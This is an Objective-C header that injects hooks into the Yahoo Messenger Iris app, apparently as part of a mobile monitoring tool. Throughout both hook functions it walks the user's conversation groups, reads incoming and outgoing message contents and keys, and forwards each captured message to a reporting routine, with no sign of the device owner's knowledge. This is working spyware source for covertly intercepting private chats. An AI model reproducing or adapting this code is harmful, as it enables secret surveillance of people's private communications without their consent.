//
//  YahooMessengerIris.h
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 3/8/2559 BE.
//
//

#import <Foundation/Foundation.h>

#import "IRSequenceAdapter.h"
#import "IRSequence.h"
#import "Item.h"
#import "GroupListViewController.h"
#import "GroupListResult.h"
#import "Group.h"
#import "GroupProxy.h"
#import "IRCollation.h"
#import "IRCollationIterator.h"
#import "User.h"
#import "Media.h"
#import "Media+Yahoo.h"
#import "Member.h"
#import "IRKey.h"
#import "IRRun.h"
#import "YahooMsgIrisUtils.h"

//Messenger Iris 1.3
#import "IRUGroupListViewController.h"
#import "IRUGroupListResult.h"
#import "FLSequenceAdapter.h"
#import "FLKey.h"
#import "FLCollation.h"
#import "FLCollationIterator.h"
#import "Group+1_3.h"
#import "IRURun.h"

#import <pthread.h>
#import <CoreData/CoreData.h>

#pragma mark -
#pragma mark Yahoo Messenger Iris
#pragma mark -

HOOK(GroupListViewController, sequenceAdapter$performRowInserts$deletes$moves$, void, id arg1, id arg2, id arg3, id arg4) {
//    DLog(@"arg1 %@", arg1);
//    DLog(@"arg2 %@", arg2);
//    DLog(@"arg3 %@", arg3);
//    DLog(@"arg4 %@", arg4);
    
    CALL_ORIG(GroupListViewController, sequenceAdapter$performRowInserts$deletes$moves$, arg1, arg2, arg3, arg4);
    
        Class $IRRun = objc_getClass("IRRun");
        Class $GroupListResult = objc_getClass("GroupListResult");
    
        [$IRRun onDataThread:^{
            @try {
                //For prevent crash
                pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
                pthread_mutex_lock(&yimMutex);
                [NSThread sleepForTimeInterval:0.01];
                pthread_mutex_unlock(&yimMutex );

                DLog(@"isDataThread %d", [$IRRun isDataThread]);
                NSMutableArray *shouldCaptureItemsArray = [NSMutableArray array];
                long long numberOfRow = [self tableView:self.tableView numberOfRowsInSection:0]; // self
                //IRSequenceAdapter *sequenceAdapter = self.dataSource;
                IRSequenceAdapter *sequenceAdapter = arg1;
                
                //DLog(@"sequenceAdapter %@, self.dataSource %@", sequenceAdapter, self.dataSource);
                DLog(@"Number of row %lld", numberOfRow);
                
                for (long long i=0; i < numberOfRow; i++) {
                    GroupListResult *groupList = [sequenceAdapter dataForRowAtIndexPath:[NSIndexPath indexPathForRow:i inSection:0]];
                    DLog(@"[IN] GroupListResult: %@", [$GroupListResult class]);
                    if ([groupList isKindOfClass:[$GroupListResult class]]) {
                        GroupProxy *groupProxy = groupList.group;
                        Group *group = groupProxy.input;
                        
                        DLog(@"group unread %d", group.unread);
                        if (group.unread) {
                            //DLog(@"unread group %@", group);
                            // all time that is smaller than latest time stamp;
                            // add to array
                            IRCollation *postedItem = group.postedItems;
                            IRCollationIterator *iterator = postedItem.iterator;
                            [iterator seekToLast];
                        
                            BOOL shouldStop = NO;
                        
                            while (iterator.isValid && !shouldStop) {
                                Item *item = iterator.value;
                                IRKey *itemKey = [item.postedItemKey copy];
                                long long createTime = item.createdTime;
                            
                                DLog(@"Item createdTime, %lld, Last st, %llu", createTime, [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]);
                                DLog(@"itemKey %@", itemKey.base64Data);
                                DLog(@"item.message %@", item.message);
                                if ([[YahooMsgIrisUtils sharedYahooUtils] canCaptureMessageWithUniqueKey:itemKey.base64Data] && createTime >= [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                                    NSDictionary *captureDic = @{@"ItemKey": itemKey, @"Group": group, @"createTime": [NSNumber numberWithLongLong:createTime]};
                                    [shouldCaptureItemsArray addObject:captureDic];
                                    [itemKey release];
                                }
                            
                                if (createTime < [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                                    shouldStop = YES;
                                }
                                else {
                                    [iterator prev];
                                }
                            }
                        }
                    }
                }
                
                //Capture Outgoing by checking last message in first group that already read
                GroupListResult *groupList = [sequenceAdapter dataForRowAtIndexPath:[NSIndexPath indexPathForRow:0 inSection:0]];
                DLog(@"[OUT] GroupListResult: %@", [$GroupListResult class]);
                if ([groupList isKindOfClass:[$GroupListResult class]]) {
                    GroupProxy *groupProxy = groupList.group;
                    Group *group = groupProxy.input;
                    
                    DLog(@"group unread %d", group.unread);
                    if (!group.unread) {
                        //DLog(@"read group %@", group);
                        IRCollation *postedItem = group.postedItems;
                        IRCollationIterator *iterator = postedItem.iterator;
                        [iterator seekToLast];
                        
                        if (iterator.valid){
                            Item *item = iterator.value;
                            IRKey *itemKey = [item.postedItemKey copy];
                            long long createTime = item.createdTime;
                            
                            DLog(@"Item createdTime, %lld, Last st, %llu", createTime, [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]);
                            DLog(@"postedItemKey %@", itemKey.base64Data);
                            DLog(@"itemKey %@", [item key]);
                            DLog(@"item.message %@", item.message);
                            DLog(@"sendState %@", item.sendState);
                            
                            if ([[YahooMsgIrisUtils sharedYahooUtils] canCaptureMessageWithUniqueKey:itemKey.base64Data]) {
                                NSDictionary *captureDic = @{@"ItemKey": itemKey, @"Group": group, @"createTime": [NSNumber numberWithLongLong:createTime]};
                                [shouldCaptureItemsArray addObject:captureDic];
                                [itemKey release];
                            }
                        }
                    }
                }
                
                DLog(@"CAPTURE %lu Messages", (unsigned long)shouldCaptureItemsArray.count);
                
                if (shouldCaptureItemsArray.count > 0) {
                    [shouldCaptureItemsArray sortedArrayUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"createdTime" ascending:YES]]];
                    
                    [shouldCaptureItemsArray enumerateObjectsUsingBlock:^(NSDictionary *messageItemDic, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
                        IRKey *itemKey = messageItemDic[@"ItemKey"];
                        Group *group = messageItemDic[@"Group"];
                        [YahooMsgIrisUtils sendTextMessageEventForItemKey:itemKey inGroup:group];
                    }];

                    //For prevent crash
                    pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
                    pthread_mutex_lock(&yimMutex);
                    [NSThread sleepForTimeInterval:0.01];
                    pthread_mutex_unlock(&yimMutex );
                }
            }
            @catch (NSException *exception) {
                DLog(@"Yahoo Exception %@", exception);
                //For prevent crash
                pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
                pthread_mutex_lock(&yimMutex);
                [NSThread sleepForTimeInterval:0.01];
                pthread_mutex_unlock(&yimMutex);
            }
            @finally {
                ;
            }

        }
            result:^{
            //DLog(@"Finished");
        } blockUI:NO];
}

//Messenger Iris 1.3
HOOK(IRUGroupListViewController, sequenceAdapter$performRowInserts$deletes$moves$, void, id arg1, id arg2, id arg3, id arg4) {
        DLog(@"arg1 %@", arg1);
        DLog(@"arg2 %@", arg2);
        DLog(@"arg3 %@", arg3);
        DLog(@"arg4 %@", arg4);
    
    CALL_ORIG(IRUGroupListViewController, sequenceAdapter$performRowInserts$deletes$moves$, arg1, arg2, arg3, arg4);
    
    Class $IRURun = objc_getClass("IRURun");
    Class $IRUGroupListResult = objc_getClass("IRUGroupListResult");
    
    [$IRURun onDataThread:^{
        @try {
            //For prevent crash
            pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
            pthread_mutex_lock(&yimMutex);
            [NSThread sleepForTimeInterval:0.01];
            pthread_mutex_unlock(&yimMutex );
            
            NSMutableArray *shouldCaptureItemsArray = [NSMutableArray array];
            long long numberOfRow = [self tableView:self.tableView numberOfRowsInSection:0]; // self
            //IRSequenceAdapter *sequenceAdapter = self.dataSource;
            FLSequenceAdapter *sequenceAdapter = arg1;
            
            //DLog(@"sequenceAdapter %@, self.dataSource %@", sequenceAdapter, self.dataSource);
            DLog(@"Number of row %lld", numberOfRow);
            
            for (long long i=0; i < numberOfRow; i++) {
                IRUGroupListResult *groupList = [sequenceAdapter dataForRowAtIndexPath:[NSIndexPath indexPathForRow:i inSection:0]];
                DLog(@"[IN] IRUGroupListResult: %@", [$IRUGroupListResult class]);
                if ([groupList isKindOfClass:[$IRUGroupListResult class]]) {
                    GroupProxy *groupProxy = groupList.group;
                    Group *group = groupProxy.input;
                    
                    DLog(@"group unread %d", group.unread);
                    if (group.unread) {
                        //DLog(@"unread group %@", group);
                        // all time that is smaller than latest time stamp;
                        // add to array
                        FLCollation *postedItem = (FLCollation *)group.postedItems;
                        FLCollationIterator *iterator = postedItem.iterator;
                        [iterator seekToLast];
                        
                        BOOL shouldStop = NO;
                        
                        while (iterator.isValid && !shouldStop) {
                            Item *item = iterator.value;
                            FLKey *itemKey = [item.postedItemKey copy];
                            long long createTime = item.createdTime;
                            
                            DLog(@"Item createdTime, %lld, Last st, %llu", createTime, [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]);
                            DLog(@"itemKey %@", itemKey.base64Data);
                            DLog(@"item.message %@", item.message);
                            if ([[YahooMsgIrisUtils sharedYahooUtils] canCaptureMessageWithUniqueKey:itemKey.base64Data] && createTime >= [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                                NSDictionary *captureDic = @{@"ItemKey": itemKey, @"Group": group, @"createTime": [NSNumber numberWithLongLong:createTime]};
                                [shouldCaptureItemsArray addObject:captureDic];
                                [itemKey release];
                            }
                            
                            if (createTime < [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
                                shouldStop = YES;
                            }
                            else {
                                [iterator prev];
                            }
                        }
                    }
                }
            }
            
            //Capture Outgoing by checking last message in first group that already read
            IRUGroupListResult *groupList = [sequenceAdapter dataForRowAtIndexPath:[NSIndexPath indexPathForRow:0 inSection:0]];
            DLog(@"[OUT] GroupListResult: %@", [$IRUGroupListResult class]);
            if ([groupList isKindOfClass:[$IRUGroupListResult class]]) {
                GroupProxy *groupProxy = groupList.group;
                Group *group = groupProxy.input;
                
                DLog(@"group unread %d", group.unread);
                if (!group.unread) {
                    //DLog(@"read group %@", group);
                    FLCollation *postedItem = (FLCollation *)group.postedItems;
                    FLCollationIterator *iterator = postedItem.iterator;
                    
                    [iterator seekToLast];
                    
                    if (iterator.valid){
                        Item *item = iterator.value;
                        FLKey *itemKey = [item.postedItemKey copy];
                        long long createTime = item.createdTime;
                        
                        DLog(@"Item createdTime, %lld, Last st, %llu", createTime, [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]);
                        DLog(@"postedItemKey %@", itemKey.base64Data);
                        DLog(@"itemKey %@", [item key]);
                        DLog(@"itemKey class %@", [[item key] class]);
                        
                        FLKey *aKey = [item performSelector:@selector(key) withObject:nil];
                        DLog(@"aKey %@", aKey.base64Data);
                        
                        DLog(@"item.message %@", item.message);
                        DLog(@"sendState %@", item.sendState);
                        
                        if ([[YahooMsgIrisUtils sharedYahooUtils] canCaptureMessageWithUniqueKey:itemKey.base64Data]) {
                            NSDictionary *captureDic = @{@"ItemKey": itemKey, @"Group": group, @"createTime": [NSNumber numberWithLongLong:createTime]};
                            [shouldCaptureItemsArray addObject:captureDic];
                            [itemKey release];
                        }
                    }
                }
            }
            
            DLog(@"CAPTURE %lu Messages", (unsigned long)shouldCaptureItemsArray.count);
            
            if (shouldCaptureItemsArray.count > 0) {
                [shouldCaptureItemsArray sortedArrayUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"createdTime" ascending:YES]]];
                
                [shouldCaptureItemsArray enumerateObjectsUsingBlock:^(NSDictionary *messageItemDic, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
                    FLKey *itemKey = messageItemDic[@"ItemKey"];
                    Group *group = messageItemDic[@"Group"];
                    [YahooMsgIrisUtils sendTextMessageEventForItemKey:(IRKey *)itemKey inGroup:group];
                }];
                
                
                //For prevent crash
                pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
                pthread_mutex_lock(&yimMutex);
                [NSThread sleepForTimeInterval:0.01];
                pthread_mutex_unlock(&yimMutex );
            }
            
        }
        @catch (NSException *exception) {
            DLog(@"Yahoo Exception %@", exception);
            //For prevent crash
            pthread_mutex_t yimMutex = [YahooMsgIrisUtils yahooIRisMutex];
            pthread_mutex_lock(&yimMutex);
            [NSThread sleepForTimeInterval:0.01];
            pthread_mutex_unlock(&yimMutex);
        }
        @finally {
            ;
        }
        
    }
        result:^{
            //DLog(@"Finished");
    } blockUI:NO];
}